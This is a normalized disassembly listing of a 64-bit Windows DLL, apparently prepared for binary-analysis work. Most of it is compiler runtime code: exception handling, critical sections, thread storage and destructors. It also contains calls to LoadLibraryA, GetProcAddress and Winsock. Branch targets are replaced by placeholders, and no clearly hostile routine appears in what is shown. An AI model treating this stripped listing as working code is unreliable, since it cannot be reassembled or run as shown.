cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp + 0x58 ]
call j_sub_18001c80c
mov rax [ rdi ]
mov [ rbp + 0x58 ] rax
mov [ rdi ] 0x0
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rbp + 0x58 ]
call sub_18001c4a0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbp + 0x68 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp + 0x70 ] rax
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] 0x0
xor eax eax
mov [ rdi ] ax
sub_18002b510
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
call sub_180001850
sub_18002b540
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x60 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x60 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
call sub_180001850
sub_18002b580
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_180001850
sub_18002b600
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x68 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800024f0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_18002b690
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_180015810
add rbx 0x50
cmp rbx rdi
jne r-xdata
sub_18002b6d0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x30
mov rbp rdx
mov r12d [ rbp + 0x34 ]
mov rdi [ rbp + 0x40 ]
mov rbx [ rbp + 0x48 ]
mov rsi [ rbp + 0x38 ]
cmp r12d 0x1
jle r-xdata
test r12d r12d
jle r-xdata
lea rax [ rdi + rdi * 4 ]
lea r8 [ rbx + rax * 8 ]
mov rdx rbx
mov rcx rsi
call sub_180002620
mov rcx rbx
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
lea rax [ rdi + rdi * 4 ]
lea rdx [ rbx + rax * 8 ]
mov r8 [ rbp + 0x50 ]
add r8 rdi
lea rax [ r8 + r8 * 4 ]
lea r8 [ rbx + rax * 8 ]
mov rcx rsi
call sub_180002620
sub_18002b760
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rax [ rbp + 0x50 ]
lea rdx [ rax + rax * 4 ]
mov rcx [ rbp + 0x38 ]
mov rax [ rcx + 0x8 ]
lea r8 [ rax + rdx * 8 ]
mov rax [ rbp + 0xe8 ]
lea rdx [ rax + rdx * 8 ]
call sub_180002620
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
sub_18002b930
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call j_sub_180002680
sub_18002bd60
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call sub_180016d40
sub_18002bed0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
mov rcx [ rbx ]
call j_sub_18001c80c
sub_18002bf10
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
call sub_1800035f0
sub_18002bff0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x24 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x24 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_1800035f0
sub_18002c160
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x60 ]
call j_sub_180002680
sub_18002c24c
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_18001cd64
nop
add rsp 0x40
pop rbp
retn
sub_18002c3c1
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_18001ec0c
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_18002c4c1
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_18001d000
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_18001ec0c
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_18001ec0c
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_18001cfcc
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_18001f178
nop
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_180001000
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_18001c40c
sub_180001050
xor eax eax
retn
sub_180001060
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_180001090
sub rsp 0x28
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x28
retn
mov rax [ rcx ]
call [ rax + 0x8 ]
sub_1800010b0
sub rsp 0x28
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x28
retn
mov rax [ rcx ]
call [ rax ]
sub_1800010d0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001c458
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180002071
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
sub_1800022d0
mov [ rsp + 0x10 ] rdx
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
add rcx 0x10
call sub_180010fd0
add rsp 0x28
retn
j_sub_180002680
jmp sub_180002680
sub_1800027f0
add rcx 0x8
jmp sub_180002680
sub_180002cbf
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_180003050
mov [ rcx + 0x8 ] dx
retn
sub_180003060
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
call [ rax + 0x48 ]
nop
xor eax eax
jmp r-xdata
add rsp 0x48
retn
sub_180003080
mov eax [ rcx + 0xa8 ]
retn
sub_180003090
mov eax [ rcx + 0xac ]
retn
sub_1800030a0
mov rcx [ rcx + 0x20 ]
mov rax [ rcx ]
jmp [ rax + 0x8 ]
sub_1800030c0
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx ]
call sub_18001c80c
mov rcx rbx
call j_sub_18001c80c
sub_180003120
sub rsp 0x28
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
mov edx 0x1
call [ rax + 0x10 ]
sub_180003190
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
retn
mov rax [ rcx ]
retn
sub_180003630
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call j_sub_18001c80c
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
sub_180005300
movzx eax [ rcx + 0x8 ]
retn
sub_180005310
mov [ rcx + 0xa ] 0x1
xor eax eax
retn
sub_180005320
movzx eax [ rcx + 0xb ]
retn
sub_180005330
mov [ rcx + 0xb ] dl
retn
sub_180008850
xor eax eax
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x28 ] rax
mov rax rcx
retn
sub_180008860
xor eax eax
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x28 ] rax
mov rax [ rsp + 0x28 ]
mov [ rcx + 0x18 ] rax
mov rax rcx
mov [ rcx + 0x10 ] r9
retn
sub_1800088d0
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] r8
retn
sub_1800095f0
mov rcx [ rcx + 0x10 ]
jmp j_sub_18001c80c#2
sub_18000a290
movzx eax [ rcx + 0x28 ]
mov [ rdx ] eax
mov rax [ rcx + 0x20 ]
retn
sub_18000a460
mov rax [ rcx + 0x10 ]
test rax rax
jne r-xdata
mov [ rcx + 0x20 ] rax
movzx eax [ rw-data ]
mov [ rcx + 0x28 ] al
mov al 0x1
retn
retn
sub_18000a480
mov rax [ rcx + 0x18 ]
test rax rax
jne r-xdata
mov [ rcx + 0x20 ] rax
movzx eax [ rw-data ]
mov [ rcx + 0x28 ] al
mov al 0x1
retn
retn
sub_18000a4a0
mov rax [ rcx + 0x8 ]
test rax rax
jne r-xdata
mov [ rcx + 0x20 ] rax
movzx eax [ rw-data ]
mov [ rcx + 0x28 ] al
mov al 0x1
retn
retn
sub_18000a580
mov rax [ rcx + 0x10 ]
test rax rax
jne r-xdata
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] 0x0
mov al 0x1
retn
retn
sub_18000a710
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_18000a720
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_18000a7a0
lea rax [ r--data ]
mov [ rcx ] rax
xor eax eax
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x38 ] eax
mov rax rcx
retn
sub_18000a800
mov al 0x1
retn
sub_18000aa50
xor eax eax
mov [ rcx + 0x40 ] dl
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x38 ] eax
lea rax [ r--data ]
mov [ rcx ] rax
mov rax rcx
retn
sub_18000adb0
mov [ rcx + 0x40 ] dl
mov al 0x1
retn
sub_18000aee0
mov eax 0x1
test edx edx
jle r-xdata
retn
mov edx edx
nop [ rax + rax ] eax
imul eax ecx
dec rdx
jne r-xdata
sub_18000b1c0
sub rsp 0x38
mov eax [ rsp + 0x60 ]
mov r10 [ rcx ]
mov [ rsp + 0x20 ] eax
call [ r10 + 0x38 ]
add rsp 0x38
retn
sub_18000b550
mov rax [ rcx ]
jmp [ rax + 0x10 ]
sub_18000bc60
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_18000bc70
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_18000e6c0
mov eax [ rcx + 0x38 ]
retn
sub_18000e6d0
mov [ rcx + 0x38 ] edx
retn
sub_18000ef40
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_18000f260
lea rax [ r--data ]
mov [ rcx + 0x8 ] 0x0
mov [ rcx ] rax
mov rax rcx
retn
sub_18000f570
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180011ed0
movzx eax [ rw-data ]
lea r11 [ r--data ]
mov [ rbx + 0x8 ] ax
mov rax rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
retn
sub_18000f5a0
mov rcx rdx
jmp sub_180013c10
sub_18000f5b0
sub rsp 0x28
mov rcx rdx
call sub_1800138d0
mov al 0x1
add rsp 0x28
retn
sub_180010150
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
call [ rax + 0x48 ]
nop
xor eax eax
jmp r-xdata
add rsp 0x38
retn
sub_180010710
mov rax [ rcx ]
mov r8 [ rcx + 0x18 ]
mov [ rdx + 0x8 ] 0x0
mov [ rdx ] rax
mov [ rdx + 0x10 ] r8
mov rax rdx
retn
sub_180011060
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180010cb0
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
sub_180012a10
sub rsp 0x28
call sub_1800126a0
mov al 0x1
add rsp 0x28
retn
sub_180012ba0
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_180012bb0
movzx eax [ rcx + 0x8 ]
retn
sub_180012bc0
mov [ rcx + 0x8 ] dl
retn
sub_180012bd0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_180012ce0
jmp [ rcx + 0x20 ]
sub_180012d20
mov rax rcx
movzx ecx dl
jmp [ rax + 0x50 ]
sub_180012f00
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] 0x0
call [ rcx + 0x50 ]
mov [ rsp + 0x40 ] eax
jmp r-xdata
add rsp 0x38
retn
sub_180012f30
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] 0x0
call [ rcx + 0x58 ]
mov [ rsp + 0x40 ] eax
jmp r-xdata
add rsp 0x38
retn
sub_180012f60
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] 0x0
call [ rcx + 0x68 ]
mov [ rsp + 0x40 ] al
jmp r-xdata
add rsp 0x38
retn
sub_180012f90
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax rcx
movzx ecx dl
call [ rax + 0x70 ]
nop
add rsp 0x38
retn
sub_180012fb0
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
xor eax eax
mov [ rsp + 0x40 ] ax
call [ rcx + 0x60 ]
mov [ rsp + 0x40 ] ax
jmp r-xdata
add rsp 0x38
retn
sub_1800132d0
xor eax eax
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] eax
mov rax rcx
retn
sub_1800132f0
retn 0x0
sub_180013300
mov [ rcx ] rdx
retn
sub_180013310
mov rax [ rcx ]
retn
sub_180013320
mov [ rcx + 0x10 ] rdx
retn
sub_180013330
mov rax [ rcx + 0x10 ]
retn
sub_180013340
mov [ rcx + 0x20 ] dx
retn
sub_180013350
movzx eax [ rcx + 0x20 ]
retn
sub_180013360
mov [ rcx + 0x18 ] rdx
retn
sub_180013370
mov rax [ rcx + 0x18 ]
retn
sub_180013380
mov [ rcx + 0x22 ] dl
retn
sub_180013390
movzx eax [ rcx + 0x22 ]
retn
sub_1800133a0
mov [ rcx + 0x8 ] rdx
retn
sub_1800133b0
mov rax [ rcx + 0x8 ]
retn
sub_1800133c0
mov [ rcx + 0x23 ] dl
retn
sub_1800133d0
movzx eax [ rcx + 0x23 ]
retn
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
sub_180013c10
sub rsp 0x38
lea r9 [ FreeLibrary ]
lea r8 [ GetProcAddress ]
lea rdx [ LoadLibraryA ]
mov [ rsp + 0x20 ] 0x0
call sub_180013990
add rsp 0x38
retn
sub_180013c40
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180012c00
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180013db0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180013180
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180013ef0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
sub rsp 0x38
lea rax [ rsp + 0x58 ]
xor r9d r9d
mov [ rsp + 0x20 ] rax
call sub_18001de00
add rsp 0x38
retn
sub_180013f20
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov dl 0x1
mov rbx rcx
call [ rax + 0x48 ]
mov rcx [ rbx + 0xc8 ]
mov rax [ rcx ]
add rsp 0x20
pop rbx
jmp [ rax + 0x28 ]
sub_180013f50
push rbx
sub rsp 0x20
mov rax [ rcx ]
xor edx edx
mov rbx rcx
call [ rax + 0x48 ]
mov rcx [ rbx + 0xc8 ]
mov rax [ rcx ]
add rsp 0x20
pop rbx
jmp [ rax + 0x30 ]
sub_180019db0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_180019ff0
sub rsp 0x28
call WSACleanup
mov al 0x1
add rsp 0x28
retn
sub_18001ba50
mov rax rcx
retn
sub_18001bee0
push rbx
sub rsp 0x20
mov r9d [ rw-data ]
mov r8d [ rw-data ]
mov rbx rdx
mov [ rsp + 0x38 ] 0x0
call sub_18001ba60
mov rax rbx
add rsp 0x20
pop rbx
retn
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
j_sub_18001c40c
jmp sub_18001c40c
sub_18001c158
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001c458
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001c17c
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
sub_18001c1b4
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001c458
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001c1d8
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
sub_18001c210
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001c458
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_18001c84c
jmp sub_18001c84c
sub_18001c26c
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x28
call sub_18001c84c
mov rcx rax
mov [ rbx ] rax
call InitializeCriticalSection
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001c294
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call DeleteCriticalSection
mov rcx [ rbx ]
add rsp 0x20
pop rbx
jmp j_sub_18001c80c
sub_18001c2b4
mov rcx [ rcx ]
jmp EnterCriticalSection
sub_18001c2bc
mov rcx [ rcx ]
jmp LeaveCriticalSection
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
sub_18001c2e4
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_18001c300
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_18001c370
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_18001c80c
sub_18001c40c
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_18001c370
sub_18001c458
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_18001c3c8
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001c9c0
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_18001e8a0
test eax eax
sete al
add rsp 0x28
retn
sub_18001cbf8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001ec0c
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_18001cc14
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001ec0c
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_18001d1f0
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_180020400
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
j_sub_18001c80c#2
jmp j_sub_18001c80c
sub_18001d2e4
mov [ rw-data ] rcx
retn
sub_18001d3f0
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001ec0c
mov [ rax + 0x1c ] ebx
add rsp 0x20
pop rbx
retn
sub_18001d408
sub rsp 0x28
call sub_18001ec0c
mov ecx [ rax + 0x1c ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ rax + 0x1c ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
add rsp 0x28
retn
sub_18001d498
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_18001d434
mov eax 0x1
add rsp 0x28
retn
sub_18001d608
sub rsp 0x28
call sub_18001d4fc
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_18001d620
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_18001de38
add rsp 0x38
retn
sub_18001d8d8
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001eb88
test rax rax
je r-xdata
mov ecx ebx
call [ ExitThread@IAT ]
mov rcx rax
call sub_18001ed64
sub_18001d8fc
sub rsp 0x28
call sub_18001ec0c
nop
mov rcx [ rax + 0x98 ]
call [ rax + 0x90 ]
mov ecx eax
call sub_18001d8d8
sub_18001e3a8
mov eax [ rw-data ]
mov r8d edx
and ecx edx
not r8d
and r8d eax
or r8d ecx
mov [ rw-data ] r8d
retn
sub_18001e694
mov [ rw-data ] rcx
retn
sub_18001e7c4
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_18001e7e4
mov [ rw-data ] rcx
retn
sub_18001e948
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18001e9dc
mov r8 [ rdx ]
jmp sub_18001e950
sub_18001e9e4
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_18001e950
FlsGetValue
jmp [ FlsGetValue@IAT ]
sub_18001ea94
mov eax [ rw-data ]
retn
sub_18001ea9c
xor eax eax
retn
FlsSetValue
jmp [ FlsSetValue@IAT ]
sub_18001eaa8
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_18002581c
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_18001ee28
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_18001c40c
sub_18001f1af
call sub_180020394
sub_18001f6a8
call sub_180020394
sub_18001f766
call sub_180020394
sub_18001ff48
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001c458
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180020394
sub rsp 0x28
call sub_18001ec0c
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_18001e368
call rcx
jmp r-xdata
sub_1800203b2
add rsp 0x28
retn
sub_1800203b8
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call sub_180020394
call rax
jmp r-xdata
sub_1800203d8
add rsp 0x28
retn
sub_1800203e0
sub rsp 0x28
lea rcx [ sub_180020394 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_1800205e8
mov [ rw-data ] rcx
retn
sub_18002073c
sub rsp 0x28
mov r8d 0x1
mov edx 0xc0000417
lea ecx [ r8 + 0x1 ]
call sub_1800205f0
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000417
mov rcx rax
add rsp 0x28
jmp [ TerminateProcess@IAT ]
sub_180020a8c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180020a50
mov ecx ebx
call [ ExitProcess@IAT ]
sub_180020aa4
mov ecx 0x8
jmp sub_1800259a4
sub_180020ab0
mov ecx 0x8
jmp sub_1800258a4
sub_180020db0
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_180020c20
sub_180020dbc
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_180020c20
sub_180020dcc
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001e650
mov ecx ebx
call sub_18001e3f0
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_180020c20
int3
sub_180021b14
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_18002316c
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_180022f9c
sub_1800239a0
sub rsp 0x28
